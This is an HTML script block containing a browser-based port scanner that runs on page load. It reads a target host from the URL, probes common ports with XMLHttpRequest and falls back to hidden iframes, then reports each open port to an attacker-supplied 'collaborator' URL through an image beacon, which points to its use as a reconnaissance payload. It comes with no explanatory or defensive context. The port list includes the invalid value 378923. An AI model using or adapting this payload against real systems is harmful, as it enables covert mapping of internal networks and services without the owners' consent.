<script type="text/javascript">
    function scanPort(host, port) {
        return new Promise((resolve) => {
            let url = `https://${host}:${port}`;
            let xhr = new XMLHttpRequest();

            xhr.open('GET', url, true);
            xhr.timeout = 5000; // Timeout in milliseconds

            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    console.log(`Port ${port} is open`);
                    sendPing(port);
                    resolve(port);
                } else {
                    resolve(null); // Port might be closed
                }
            };

            xhr.ontimeout = function() {
                console.log(`Port ${port} timed out`);
                resolve(null); // Port is closed or not serving HTTP content
            };

            xhr.onerror = function() {
                // If there's an error due to CORS, fall back to iframe method
                scanPortWithIframe(host, port).then(resolve);
            };

            try {
                xhr.send();
            } catch (error) {
                // If there's an exception (e.g., due to CORS), fall back to iframe method
                scanPortWithIframe(host, port).then(resolve);
            }
        });
    }

    function scanPortWithIframe(host, port) {
        return new Promise((resolve) => {
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';

            let timeout = setTimeout(() => {
                document.body.removeChild(iframe);
                resolve(null); // Port is closed or not serving HTTP content
            }, 5000); // Timeout in milliseconds

            iframe.onload = function() {
                clearTimeout(timeout);
                console.log(`Port ${port} is open`);
                sendPing(port);
                document.body.removeChild(iframe);
                resolve(port);
            };

            iframe.onerror = function() {
                clearTimeout(timeout);
                document.body.removeChild(iframe);
                resolve(null); // Port is closed or not serving HTTP content
            };

            let url = `https://${host}:${port}`;
            iframe.src = url;
            document.body.appendChild(iframe);
        });
    }

    async function scanPorts(host, ports) {
        let openPorts = [];
        for (let port of ports) {
            let result = await scanPort(host, port);
            if (result) {
                openPorts.push(result);
            }
        }
        return openPorts;
    }

    function sendPing(port) {
        let collaboratorUrl = new URLSearchParams(window.location.search).get('url');
        let pingUrl = `${collaboratorUrl}?port=${port}`;
        let img = new Image();
        img.src = pingUrl;
        console.log(`Ping sent to ${pingUrl}`);
    }

    document.addEventListener("DOMContentLoaded", function() {
        let host = new URLSearchParams(window.location.search).get('host'); // Replace with your target host
        let ports = [80, 443, 8080, 3000, 22, 21, 378923]; // List of ports to scan
        scanPorts(host, ports).then(openPorts => {
            console.log("Open ports:", openPorts);
        });
    });
</script>
